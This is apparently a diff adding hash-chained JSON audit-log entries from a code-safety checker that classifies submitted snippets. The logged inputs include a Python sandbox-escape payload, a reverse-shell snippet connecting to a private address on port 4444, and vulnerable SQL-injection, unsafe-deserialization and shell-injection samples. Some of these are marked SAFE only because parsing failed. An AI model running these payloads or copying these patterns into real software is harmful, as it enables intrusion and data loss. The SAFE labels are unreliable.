+    "classification": "HIGH_RISK",
+    "result": "Attack Payload: ().__class__.__bases__[0].__subclasses__()",
+    "previous_hash": "875f6ece2675845e1755b4347080987d4fb5bc75f1322ee68fab1f810aec89e1",
+    "current_hash": "3a100b45e084e88a2a0ffae419a7bce688a5f4a54c87dd42675e230e0963e1fa"
+  },
+  {
+    "timestamp": "2026-04-02T10:42:58.896572+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "().__class__.__bases__[0].__subclasses__()",
+    "classification": "HIGH_RISK",
+    "result": "Attack Payload: ().__class__.__bases__[0].__subclasses__()",
+    "previous_hash": "3a100b45e084e88a2a0ffae419a7bce688a5f4a54c87dd42675e230e0963e1fa",
+    "current_hash": "91ecb190f38ca03a3169e57486f3b0731b03cb916c06b9b63057c7e7eebf1e43"
+  },
+  {
+    "timestamp": "2026-04-02T10:45:53.490849+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "().__class__.__bases__[0].__subclasses__()",
+    "classification": "HIGH_RISK",
+    "result": "Attack Payload: ().__class__.__bases__[0].__subclasses__()",
+    "previous_hash": "91ecb190f38ca03a3169e57486f3b0731b03cb916c06b9b63057c7e7eebf1e43",
+    "current_hash": "0552cef5a43278f0f38ff1eacadae0639b9ef18f42e89980399ea9aa554ac931"
+  },
+  {
+    "timestamp": "2026-04-02T10:49:17.848548+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "import os\nimport socket\ns = socket.socket()\ns.connect(('192.168.1.100', 4444))\nos.dup2(s.fileno(), 0)",
+    "classification": "BLOCKED",
+    "result": "Offending Payload: import os",
+    "previous_hash": "0552cef5a43278f0f38ff1eacadae0639b9ef18f42e89980399ea9aa554ac931",
+    "current_hash": "a1be0f7bcc867bcc40ca5b25c6801d48190c1e2f0b1e7b1688396803083eb2aa"
+  },
+  {
+    "timestamp": "2026-04-02T10:57:15.234309+00:00",
+    "ip_address": "127.0.0.1",
+    "input": "# Malicious system breach attempt:\n# 1. Targeting the subprocess engine\nimport subprocess\n# 2. Executing external reconnaissance\nres = subprocess.run(['ls', '/'], capture_output=True)\n# 3. Reading sensitive output\nprint(res.stdout)",
+    "classification": "BLOCKED",
+    "result": "Offending Payload: # 1. Targeting the subprocess engine",
+    "previous_hash": "a1be0f7bcc867bcc40ca5b25c6801d48190c1e2f0b1e7b1688396803083eb2aa",
+    "current_hash": "9e4eb43b3539f503e17144befd04a95f7bf19e905573f698ba7eae00028cf83a"
+  },
+  {
+    "timestamp": "2026-04-02 21:33:42",
+    "ip_address": "127.0.0.1",
+    "input": "// DANGEROUS: Deserializes any class available on the classpath\nObjectInputStream ois = new ObjectInputStream(inputStream);\nObject obj = ois.readObject();",
+    "classification": "SAFE",
+    "result": "SyntaxError: invalid syntax (<unknown>, line 1)",
+    "previous_hash": "9e4eb43b3539f503e17144befd04a95f7bf19e905573f698ba7eae00028cf83a",
+    "current_hash": "b73c37cfc4afea35b01be5e584d8c78bcf73196b8887e138a2d13d7c8defcf1c"
+  },
+  {
+    "timestamp": "2026-04-02 21:34:21",
+    "ip_address": "127.0.0.1",
+    "input": "// DANGEROUS: Concatenation allows an attacker to alter the query logic\nString query = \"SELECT * FROM users WHERE username = '\" + username + \"'\";\nStatement stmt = connection.createStatement();\nResultSet rs = stmt.executeQuery(query);",
+    "classification": "SAFE",
+    "result": "SyntaxError: invalid syntax (<unknown>, line 1)",
+    "previous_hash": "b73c37cfc4afea35b01be5e584d8c78bcf73196b8887e138a2d13d7c8defcf1c",
+    "current_hash": "bb98b081fa3a394917de65aa60301d8c0453c2d5477a05e3cb1dbc172042aa3d"
+  },
+  {
+    "timestamp": "2026-04-02 21:37:28",
+    "ip_address": "127.0.0.1",
+    "input": "sum(5+3)\nprint(sum)",
+    "classification": "SAFE",
+    "result": "SyntaxError: invalid syntax (<unknown>, line 2)",
+    "previous_hash": "bb98b081fa3a394917de65aa60301d8c0453c2d5477a05e3cb1dbc172042aa3d",
+    "current_hash": "857839c9df58956d577c776c966670f259b3f17ee27368d1bef534a0814fc99a"
+  },
+  {
+    "timestamp": "2026-04-02 21:38:07",
+    "ip_address": "127.0.0.1",
+    "input": "// DANGEROUS: Concatenation allows an attacker to alter the query logic\nString query = \"SELECT * FROM users WHERE username = '\" + username + \"'\";\nStatement stmt = connection.createStatement();\nResultSet rs = stmt.executeQuery(query);",
+    "classification": "SAFE",
+    "result": "SyntaxError: invalid syntax (<unknown>, line 1)",
+    "previous_hash": "857839c9df58956d577c776c966670f259b3f17ee27368d1bef534a0814fc99a",
+    "current_hash": "6cfe3eb96cbab7446e8452a8c413537372ef38e791d41a59e0498de8b9f677a1"
+  },
+  {
+    "timestamp": "2026-04-02 21:40:45",
+    "ip_address": "127.0.0.1",
+    "input": "sum(5+3)\nprint(sum)",
+    "classification": "SAFE",
+    "result": "SyntaxError: invalid syntax (<unknown>, line 2)",
+    "previous_hash": "6cfe3eb96cbab7446e8452a8c413537372ef38e791d41a59e0498de8b9f677a1",
+    "current_hash": "46040c399729dfe06cd88bc6f015b5e694055e77f418804f2362eb1332ce79f2"
+  },
+  {
+    "timestamp": "2026-04-02 21:41:51",
+    "ip_address": "127.0.0.1",
+    "input": "# DANGEROUS: Directly concatenates input into a shell command\nimport os\nfilename = input(\"File to delete: \")\nos.system(f\"rm -f {filename}\")",
+    "classification": "BLOCKED",
+    "result": "Offending Payload: import os",
+    "previous_hash": "46040c399729dfe06cd88bc6f015b5e694055e77f418804f2362eb1332ce79f2",
+    "current_hash": "a1c6c38afdd16e4f2fe87afea709a3acac8228f9355971e2786e0e91c5c664b6"
+  },
+  {
+    "timestamp": "2026-04-02 22:25:56",
+    "ip_address": "127.0.0.1",
+    "input": "sum(2+3)\nprint(sum)",
+    "classification": "SAFE",
+    "result": "SyntaxError: invalid syntax (<unknown>, line 2)",
+    "previous_hash": "a1c6c38afdd16e4f2fe87afea709a3acac8228f9355971e2786e0e91c5c664b6",
+    "current_hash": "b1b1092e158941bc142cc3f984f806fa0c49fa623826ca57731107904eb6b4c0"
+  },
+  {
+    "timestamp": "2026-04-02 22:26:33",
+    "ip_address": "127.0.0.1",
+    "input": "# DANGEROUS: Directly concatenates input into a shell command\nimport os\nfilename = input(\"File to delete: \")\nos.system(f\"rm -f {filename}\")",
+    "classification": "BLOCKED",
+    "result": "Offending Payload: import os",
+    "previous_hash": "b1b1092e158941bc142cc3f984f806fa0c49fa623826ca57731107904eb6b4c0",
+    "current_hash": "bacccd01f5a67039d5ba6fb7310432881e68344a38ceefe169b4be68a70eeb9a"
+  }
+]
